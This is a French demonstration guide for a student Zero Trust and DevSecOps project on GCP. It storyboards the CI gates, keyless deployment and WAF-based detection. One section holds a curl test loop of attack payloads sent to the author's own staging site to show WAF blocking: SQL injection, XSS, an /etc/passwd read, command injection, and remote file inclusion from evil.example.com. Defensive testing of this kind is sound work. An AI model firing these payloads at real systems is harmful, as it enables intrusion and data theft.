# GUIDE DE LA DÉMONSTRATION TECHNIQUE — socle MENAL

## Les trois chaînes en un seul scénario

**Zero Trust · DevSecOps · Supervision — socle cloud GCP, validation sur ELSON**
Projet de fin d'études — Habiboullah Mansour — ESPRIT, 2025-2026 — MENAL-SARL
Durée cible : 5 minutes (repli 3 min 30) — démonstration de bout en bout

> **Version du 07/09/2026, recalée sur le CODE et l'INFRASTRUCTURE RÉELS**, pas sur le mémoire.
> Toute donnée annoncée dans cette démo a été **exécutée en direct** contre le projet
> `menal-zero-trust-staging` la nuit du 06 au 07/09 (voir `PREUVES_LIVE_07-09-2026.md`). Là où le
> réel diverge du mémoire, on montre le réel et on le dit ; les corrections à porter au mémoire
> sont dans `CORRECTIONS_RAPPORT_PFE.md`.

---

## 0. Ce qui change par rapport au guide précédent (aligné mémoire → aligné réel)

Le guide précédent décrivait le mémoire. Or l'infrastructure réelle est **plus riche et plus forte**
que le mémoire sur presque tout. Un jury qui teste vérifiera le système, pas le PDF : la démo doit
donc montrer le système réel. Huit recalages :

| # | Guide précédent (mémoire) | Réel vérifié en direct | Ce qu'on montre |
|---|---|---|---|
| 1 | « recette » | environnement **`staging`** (`menal-zero-trust-staging`) | On dit « environnement de validation, topologie de production ». Pas de projet prod encore (dev désactivé + staging). |
| 2 | 4 règles Cloud Armor OWASP | **5 règles OWASP** (sqli, xss, lfi, rce, rfi) + geo-block + **rate-limit** (10/min, ban 300 s) + throttle | On montre les 5 familles + on cite le rate-limit à l'oral. |
| 3 | 5 règles R1–R5 | **7 règles R1–R7** en SQL BigQuery + 2 règles temps réel (RT-WAF, RT-RBAC) | On montre l'écran Détections réel : R2/R3/R6/R7 s'y trouvent. |
| 4 | R2 = HIGH, T1190 | R2 « Pic WAF » = **MEDIUM, T1498** ; c'est **R6** (injection) qui est **CRITICAL, T1190** | On lit l'écran tel quel, sans forcer un T1190 sur R2. |
| 5 | 6 comptes de service | **8 comptes** (dont compute par défaut + sa-pipeline) ; **0 clé sur les 8** | On dit « 0 clé, fédération WIF » — le point fort tient et se prouve. |
| 6 | traversal `....//` non conforme (302) | traversal `....//` **bloqué 403** par le WAF (règle LFI 1200) aujourd'hui | On le montre bloqué ; la vraie limite honnête à citer est ailleurs (S1–S5 du relevé). |
| 7 | « l'administrateur enregistre le verdict » (impossible : pas de bouton, table vide) | **bouton de qualification ajouté** au dashboard le 07/09 ; verdict réel posé (201), `analyst_verdicts` peuplé | On clique **réellement** dans le dashboard — UC5 est devenu vrai. |
| 8 | déploiement « par empreinte sha256 » | CI déploie par tag **`github.sha`** (image nommée d'après le commit) | On dit « chaque image porte l'empreinte du commit qui l'a produite », sans sur-vendre un digest. |

---

## 1. Le scénario : une seule histoire, trois chaînes

On suit **un seul objet** — une version d'ELSON — de son commit jusqu'à ce qu'elle soit attaquée
en ligne.

```
commit → portes bloquantes CI → correction → fusion → déploiement fédéré sans clé
→ adresse directe refusée (404) → attaque (13 requêtes) → 403 WAF → détection R2/R3/R6
→ incident score 100 (2 tactiques, +15) → 3 candidats ATT&CK → verdict humain
```

### 1.1 Les trois chaînes, sous le vocabulaire réel

| Chaîne | Moment | Ce que le jury voit | Preuve |
|---|---|---|---|
| **Livraison applicative (F3)** | Plans 2–5 | CI GitHub Actions : Gitleaks, Semgrep, tests, Trivy ; une porte refuse ; après correction, vert. Déploiement WIF sans clé. | `.github/workflows/ci.yml`, `elson-ci.yml` ; run réels PR/main |
| **Architecture Zero Trust** | Plans 1, 6, 7 | Adresse directe `.run.app` → **404** ; domaine public → **200** ; base sans IP publique. | Test live P1–P2 ; `ingress=INTERNAL_LOAD_BALANCER` |
| **Supervision (F4)** | Plans 8–11 | 13 requêtes → **403**, détections R2/R3/R6, incident score 100, 3 candidats ATT&CK, verdict humain. | Test live P3, P8, P9, P10 |

### 1.2 Les trois refus (chaque chaîne a son moment de vérité)

| Chaîne | Le refus montré | Nature | Preuve |
|---|---|---|---|
| Livraison (F3) | Une porte CI arrête la chaîne (Trivy CRITICAL, ou Semgrep, ou Gitleaks) | Provoqué (branche de test) ; refus réel documenté : faux-vert Semgrep du 16/08 corrigé (K23) | `ci.yml`, `preuves/K23.txt` |
| Zero Trust | L'adresse directe `.run.app` renvoie 404 depuis Internet | Vérification en direct | P1 : 5 services → 404 |
| Supervision (F4) | Cloud Armor refuse 13 requêtes en 403 avant l'application | Rejeu réel (mon attaque du 07/09) | P3, P8 |

---

## 2. Ce qui se filme — et ce qui reste en diapositive

### 2.1 Dans la vidéo

| Élément filmé | Chaîne | Durée |
|---|---|---|
| La demande de fusion + les portes CI qui s'exécutent, une **bloque** | F3 | ~50 s |
| La correction, puis le vert | F3 | ~20 s |
| Le déploiement : WIF sans clé, image taguée par le commit | Zero Trust | ~20 s |
| `curl` adresse directe `.run.app` → **404** ; domaine public → **200** | Zero Trust | ~20 s |
| L'attaque : 13 requêtes + 1 légitime, les 403 (terminal) | F4 | ~25 s |
| L'écran Détections réel (R2/R3/R6, MITRE) | F4 | ~25 s |
| La fiche incident : score 100, 2 tactiques, +15, chronologie | F4 | ~25 s |
| Les 3 candidats ATT&CK de la qualification assistée | F4 | ~25 s |
| **Le clic de verdict « Vrai positif » dans le dashboard** | F4 | ~30 s |

### 2.2 Sur les diapositives, jamais filmé

Diagrammes d'architecture, matrice des identités, détail des règles, mesures chiffrées (coût,
RTO/RPO), théorie NIST/STRIDE/ATT&CK-BERT. Commentés à l'oral avant/après la vidéo.

---

## 3. Le storyboard, plan par plan

Douze plans, débit calme (~150 mots/min). Domaines réels : `elson.menal-sarl.com`,
`api-staging.menal-sarl.com`, `dashboard.menal-sarl.com`.

---

### Plan 0 — Ouverture (0:00–0:25)

**Voix off.** « MENAL-SARL développe plusieurs produits. J'ai conçu et réalisé un socle cloud
commun qui apporte à chaque application trois choses : une livraison sécurisée, une architecture
Zero Trust, et une supervision. Je vais le prouver en suivant une seule version d'ELSON, de son
code jusqu'à une attaque en ligne. »

---

### Plan 1 — L'application en ligne (0:25–0:40) · *Zero Trust*

**À l'écran.** Navigateur sur `https://elson.menal-sarl.com`, HTTPS, cadenas.
**Voix off.** « Voici ELSON en ligne, joignable uniquement par le point d'entrée unique, en HTTPS,
certificat renouvelé automatiquement. Nous allons lui livrer une nouvelle version. »
**Preuve.** P2 : `elson.menal-sarl.com/` → 200.

---

### Plan 2 — Le développeur livre (0:40–0:55) · *F3*

**À l'écran.** Le commit poussé, la demande de fusion GitHub.
**Voix off.** « J'ouvre une demande de fusion. La chaîne exécute tous ses contrôles mais ne publie
rien : elle **ne s'authentifie même pas** auprès du cloud. L'identité fédérée n'est obtenue qu'à la
fusion sur `main`. »
**Preuve.** `ci.yml` / `elson-ci.yml` : l'authentification GCP est gardée par
`if: github.ref == 'refs/heads/main'`. Aucune auth sur PR.

---

### Plan 3 — Les portes s'exécutent… et une **bloque** (0:55–1:30) · *F3*

**À l'écran.** Le journal GitHub Actions : Gitleaks (secrets), Semgrep (SAST), tests, puis **Trivy
image en rouge** sur une vulnérabilité CRITICAL corrigeable, code de sortie 1.
**Voix off.** « La chaîne enchaîne : recherche de secrets avec Gitleaks, analyse statique avec
Semgrep, tests, puis analyse de l'image avec Trivy. Ici, Trivy détecte une vulnérabilité critique
et corrigeable, et arrête tout : aucune image publiée, rien déployé. Ce refus est provoqué. Le même
mécanisme a produit, le 16 août, un vrai incident : une porte d'analyse statique qui se déclarait
verte sans rien évaluer — un faux-vert que j'ai détecté et corrigé. »
**Preuve.** `ci.yml` (Trivy `--exit-code 1 --severity CRITICAL --ignore-unfixed`, bloquant) ;
`rapport PFE/preuves/K23.txt` (faux-vert Semgrep du 16/08, corrigé).
**Conseil.** Nommer les 3 outils en une incise. Ne jamais prétendre que le refus filmé est réel :
le refus réel documenté est le faux-vert du 16/08.

---

### Plan 4 — La correction, puis le vert (1:30–1:50) · *F3*

**À l'écran.** Le commit de correction, la même chaîne intégralement verte.
**Voix off.** « Je corrige la dépendance, je relance. Cette fois toutes les portes passent : aucun
secret, aucun constat bloquant, aucune vulnérabilité critique corrigeable. La version est autorisée
à être publiée. »

---

### Plan 5 — La fusion déclenche le déploiement (1:50–2:10) · *F3 → Zero Trust*

**À l'écran.** Le bouton de fusion, la chaîne complète qui repart.
**Voix off.** « Je fusionne sur la branche principale. C'est seulement maintenant que la chaîne
s'authentifie : elle présente un jeton signé par GitHub, vérifié pour le dépôt **et** pour la
branche, et reçoit l'identité `sa-cicd` pour la durée de l'exécution seulement. »
**Preuve.** WIF `attribute_condition` : `repository == 'Mansour37/menal-zero-trust' && ref == 'refs/heads/main'`.

---

### Plan 6 — La version déployée, sans clé (2:10–2:30) · *Zero Trust*

**À l'écran.** La révision Cloud Run : son identité de service, l'image taguée du commit.
**Voix off.** « La nouvelle révision tourne sous une identité de service dédiée, aux droits
minimaux, et exécute exactement l'image qui a passé les portes, taguée par l'empreinte du commit.
Aucune clé n'est stockée : la chaîne a **prouvé** son identité, elle ne l'a pas détenue. Sur huit
comptes de service, l'inventaire relève **zéro clé**. »
**Preuve.** P5 : 8 SA, 0 clé user-managed.

---

### Plan 7 — Rien n'est joignable directement (2:30–2:50) · *Zero Trust*

**À l'écran.** Deux commandes côte à côte :
```bash
curl -s -o /dev/null -w "%{http_code}\n" https://elson-web-staging-slxt6oscea-ew.a.run.app/   # -> 404
curl -s -o /dev/null -w "%{http_code}\n" https://elson.menal-sarl.com/                          # -> 200
```
**Voix off.** « L'entrée des services est réglée sur "interne et répartiteur" : l'adresse directe
que le fournisseur attribue au service n'accepte plus les connexions d'Internet — 404. Le domaine
public, lui, passe par le filtrage et répond 200. La base de données, elle, n'a aucune adresse
publique. »
**Preuve.** P1–P2 ; `ingress=INTERNAL_LOAD_BALANCER` ; Cloud SQL `ipv4_enabled=false`.

---

### Plan 8 — L'attaque (2:50–3:15) · *F4*

**À l'écran.** Le terminal : la boucle de requêtes, une colonne de `403`, puis un `200` légitime.
**Voix off.** « La version est en ligne : voyons comment le socle réagit. J'envoie treize requêtes
malveillantes depuis une même adresse — injection SQL, script inter-sites, inclusion de fichier.
Toutes reçoivent un 403 du filtrage applicatif, avant d'atteindre ELSON ; la requête légitime,
elle, est servie en 200. »
**Preuve.** P3. Script réel :
```bash
BASE="https://elson.menal-sarl.com"
for p in "q=' UNION SELECT NULL,version()--" "q=<script>alert(1)</script>" "file=/etc/passwd" \
         "cmd=;cat /etc/hosts" "page=http://evil.example.com/s.txt" ; do
  curl -s -o /dev/null -w "%{http_code}\n" -G "$BASE/api/search" --data-urlencode "$p"   # attendu : 403
done
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/api/health"                                # attendu : 200
```
**Conseil.** Préciser que l'adresse `41.188.116.214` est celle du poste de test (assumée, pas
floutée) désamorce l'objection réseau.

---

### Plan 9 — La détection (3:15–3:40) · *F4*

**À l'écran.** L'écran Détections du dashboard : lignes réelles, R2 « Pic WAF » avec le message
*« 13 requêtes bloquées par Cloud Armor depuis 41.188.116.214 en 15 min »*, R3 « Path traversal »,
R6 « Pattern injection ».
**Voix off.** « Les refus sont journalisés, puis lus dans l'entrepôt BigQuery par sept règles
écrites en SQL, versionnées, exécutées toutes les cinq minutes sur une fenêtre glissante de quinze
minutes. La règle R2 compte les requêtes bloquées par adresse source : au-delà de dix, elle écrit
**une seule** détection. Une même rafale ne produit pas treize alertes, mais une, dont le compteur
donne l'ampleur. »
**Preuve.** P6–P8. **Dire « entrepôt de sécurité », pas « SIEM commercial »** (choix assumé).
**Latence :** carton « ~5–10 min plus tard » entre plans 8 et 9 (cadence 5 min × 2 étapes).

---

### Plan 10 — La qualification assistée (3:40–4:05) · *F4, cœur du projet*

**À l'écran.** Le détail : les 3 candidats ATT&CK avec score.
**Voix off.** « C'est l'apport principal. Pour aider une personne seule à qualifier une alerte, le
socle propose automatiquement les trois techniques d'attaque les plus proches sémantiquement, avec
un score. Sur mon attaque d'inclusion de fichier `/etc/passwd`, il propose **T1003.008 — vol
d'identifiants via /etc/passwd, à 0,71**, alors qu'aucun mot "identifiant" n'apparaît dans la
requête : le modèle comprend le **sens**. Le rapprochement est **déterministe à modèle fixé** et
**s'exécute localement** : un encodeur spécialisé, ATT&CK-BERT, pas un modèle génératif. Le socle
propose, l'humain décide. »
**Preuve.** P9 : T1003.008 (0,71), T1003.002 (0,64), T1556.003 (0,638), modèle
`attack-bert-onnx-fp32@v1.0`, seuil 0,60.

---

### Plan 11 — Le verdict, et ce que j'ai construit (4:05–4:40) · *F4 → clôture*

**À l'écran.** La fiche incident réelle : score 100/100 CRITICAL, 2 tactiques, « Chaîne d'attaque
probable (bonus +15) », puis **le clic sur le bouton « Vrai positif »** de la Card « Qualification
analyste ». Le verdict s'affiche.
**Voix off.** « L'administrateur tranche : vrai positif. Ce bouton — que j'ai ajouté au tableau de
bord — écrit le verdict dans une table à part, en ajout seul : la preuve n'est jamais modifiée, la
décision humaine s'y ajoute. De bout en bout — du commit au verdict — j'ai réalisé la chaîne de
livraison sécurisée, l'architecture Zero Trust et la supervision. ELSON n'est que le premier cas de
validation : l'architecture est décrite en code et **indépendante de l'application supervisée**. »
**Preuve.** P10 ; capture `03-incident-verdict.png`.
**Conseil.** Montrer le clic : c'est la preuve que l'humain garde la décision (UC5). C'est le plan
que le guide précédent ne pouvait pas tenir — il est maintenant réel.

---

**Total : ~4 min 40.**
**Repli 3 min 30 :** fusionner plans 3-4, fondre plans 6-7, raccourcir plan 11. On garde les
**trois refus** et la **qualification + verdict**.

---

## 4. Préparation avant d'enregistrer

### 4.1 Environnement et anti-cold-start

- Tourner sur `staging` (topologie de production). **Réveiller** ELSON, l'API et le dashboard par
  une requête quelques minutes avant : les instances sont à zéro hors trafic (démarrage à froid).
- **Dashboard en build de production**, jamais `npm run dev` : en dev, le middleware d'auth est
  bypassé **et** le mode démo est autorisé. Commande :
  ```bash
  cd dashboard && npm ci
  API_URL="https://api-staging.menal-sarl.com" DEMO_MODE=false ./node_modules/.bin/next start -p 3000
  # (sous Windows, ne pas utiliser `npm start` : le script ${PORT:-3000} n'est pas expansé par cmd.exe)
  ```
- **Contrôle visuel à chaque plan** : la pastille en haut à droite doit dire **« Données à jour »**
  (verte) + « Live », jamais « Mode démonstration » ni « API dégradée ».
- Badge « RECETTE » du sidebar : à assumer (« environnement de validation ») ou à retirer.

### 4.2 Le piège des IP à l'écran

Le dashboard **n'anonymise pas** les IP : l'entité (IP) apparaît en titre de fiche et **dans l'URL**.
Deux options honnêtes : tourner sur des IP qui sont les vôtres (le poste de test, assumé à l'oral),
ou flouter au montage. Ne pas basculer sur le mock pour avoir des IP « propres » (RFC 5737).

### 4.3 La latence (plan 9)

L'alerte tombe en ~5–10 min (cadence 5 min × normalisation + règle). **Ne pas laisser tourner la
vidéo.** Couper entre plans 8 et 9 avec un carton « ~5–10 min plus tard » ou des horodatages réels.
**À ne pas faire :** accélérer sans le dire, ou fabriquer une alerte instantanée.

### 4.4 Poser le verdict pendant le tournage

Le bouton est en place. Se connecter au dashboard avec l'admin (identifiants dans `credentials.txt`,
**non committé**), ouvrir la fiche de l'incident de l'attaque, cliquer « Vrai positif », montrer le
verdict enregistré. Si l'admin a la MFA activée (recommandé, voir S1), montrer aussi le second
facteur au login — cela renforce le plan Zero Trust.

---

## 5. Questions du jury — réponses ancrées sur le réel

| Question | Réponse |
|---|---|
| **« Le blocage de la porte, vous l'avez fabriqué ? »** | Celui filmé est provoqué. Mais le même mécanisme a produit un vrai incident le 16/08 : une porte SAST qui se déclarait verte sans rien évaluer (faux-vert Semgrep), détectée et corrigée — preuve K23. |
| **« Comment déployez-vous sans clé ? »** | Fédération d'identité WIF : la chaîne présente un jeton GitHub, le cloud vérifie le dépôt **et** la branche, puis accorde une identité courte. Inventaire : **0 clé sur 8 comptes de service**. |
| **« En quoi est-ce du Zero Trust et pas un pare-feu ? »** | L'adresse directe des services renvoie 404 (ingress interne+LB), la base n'a pas d'IP publique, et sur le plan de contrôle cloud c'est l'**identité** qui décide, pas le réseau. Démonstration live : 5 services → 404, 3 domaines → 200. |
| **« Une seule alerte pour treize requêtes ? »** | Choix de conception : une détection par (règle, entité, fenêtre), dont le compteur donne l'ampleur. R2 écrit littéralement « 13 requêtes bloquées… en 15 min ». On évite la fatigue d'alerte. |
| **« Qu'apporte la qualification assistée ? »** | Elle propose les 3 techniques ATT&CK les plus proches **sémantiquement**. Sur mon LFI `/etc/passwd`, elle propose T1003.008 (vol d'identifiants via /etc/passwd) à 0,71 — pertinent sans aucun mot-clé commun. Encodeur ATT&CK-BERT, déterministe, local. |
| **« Combien de règles ? »** | Sept règles SQL versionnées (R1 force brute, R2 pic WAF, R3 traversal, R4 user-agent, R5 latence, R6 injection, R7 fichiers sensibles), plus deux règles temps réel en base. Chacune pose une technique MITRE. |
| **« Le verdict, c'est réel ? »** | Oui : bouton de qualification dans la fiche incident, écriture append-only dans `analyst_verdicts` via l'API (rôle admin). Testé de bout en bout le 07/09. |
| **« Y a-t-il quelque chose qui ne marche pas ? »** | Oui, et je l'assume : pas encore de projet production (dev+staging), le compte admin de démo n'a pas encore la MFA activée, la couverture de tests du dashboard est faible (3 %, dette tracée en CI), et le déploiement se fait par tag de commit et non par digest immuable. Ce sont mes prochains chantiers, chacun s'ajoute sans refondre l'architecture. |

---

## 6. À retenir en une page

### La phrase qui résume tout

> « Du commit au verdict, j'ai réalisé les trois chaînes du socle — livraison sécurisée, Zero Trust,
> supervision — et ELSON n'en est que le premier cas de validation. »

### Les trois refus qui font la démo

| Chaîne | Le refus | Nature | Preuve |
|---|---|---|---|
| Livraison (F3) | Une porte CI arrête la chaîne | Provoqué ; faux-vert réel du 16/08 corrigé | `ci.yml`, K23 |
| Zero Trust | Adresse directe → 404, base sans IP publique | Vérif live | P1–P2 |
| Supervision (F4) | 13 requêtes → 403, R2/R3/R6 écrivent des détections | Rejeu réel | P3, P8 |

### Les cinq chiffres réels à connaître

| Chiffre | Ce qu'il prouve | Preuve |
|---|---|---|
| **0 clé / 8 comptes** | Fédération sans clé | P5 |
| **404 vs 200** | Frontière Zero Trust | P1–P2 |
| **7 règles + 2 temps réel** | Détection versionnée | P6–P7 |
| **score 100, +15** | Corrélation en incident (2 tactiques) | P8 |
| **T1003.008 à 0,71** | Qualification sémantique réelle | P9 |
